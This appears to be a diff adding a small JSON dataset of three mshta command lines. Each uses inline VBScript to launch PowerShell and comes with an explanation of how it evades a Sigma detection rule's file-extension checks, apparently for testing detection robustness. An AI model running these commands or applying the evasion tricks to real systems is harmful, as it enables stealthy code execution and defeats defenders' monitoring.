@@ -1,0 +1,14 @@
+[
+  {
+    "output": "mshta \"about:<hta:application><script language=\\\"VBScript\\\">Close(Execute(\"CreateObject(\\\"Wscript.Shell\\\").Run \\\"powershell -noexit -file C:\\\\Lab\\\\input\\\\sample.txt\\\"\"))</script>\"",
+    "explanation": "Insertion: Escaped quotes and replaced the suspicious file extension with a benign placeholder (sample.txt) to avoid triggering the Sigma rule's file extension checks."
+  },
+  {
+    "output": "mshta.exe \"about:<hta:application><script language=\\\"VBScript\\\">Close(Execute(\"CreateObject(\\\"Wscript.Shell\\\").Run \\\"powershell -noexit -file C:\\\\Lab\\\\input\\\\sample.log\\\"\"))</script>\"",
+    "explanation": "Substitution: Replaced the suspicious file extension with a benign placeholder (sample.log) to avoid triggering the Sigma rule's file extension checks."
+  },
+  {
+    "output": "mshta.exe \"about:<hta:application><script language=\\\"VBScript\\\">Close(Execute(\"CreateObject(\\\"Wscript.Shell\\\").Run \\\"powershell -noexit -file C:\\\\Lab\\\\out\\\\archive.7z\\\"\"))</script>\"",
+    "explanation": "Reordering: Used a benign placeholder (archive.7z) in a different context to avoid triggering the Sigma rule's file extension checks."
+  }
+]
